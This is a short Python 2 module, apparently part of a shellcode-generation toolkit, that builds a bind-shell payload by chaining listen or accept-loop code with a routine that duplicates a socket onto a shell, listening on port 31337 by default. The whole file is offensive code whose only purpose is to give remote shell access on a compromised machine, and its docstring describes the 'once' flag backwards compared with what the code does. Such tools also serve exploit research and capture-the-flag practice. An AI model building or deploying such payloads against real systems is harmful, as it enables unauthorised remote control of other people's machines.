import listen
import acceptloop
import dupsh
from socket import *

def generate(port=31337, sock=4, once=True):
    """bind shell on specific port

    Args:
        port(int): specific port
        
        sock(int/str/reg): connection sock will be mapped with shell
        
        once(boolean): binds on port infinity if true
                       binds on port once if false 
    """

    if once:
        sc = listen.generate(int(port))
    else:
        sc = acceptloop.generate(int(port))

    sc += dupsh.generate(sock)

    return sc

if __name__ == '__main__':
    print generate()
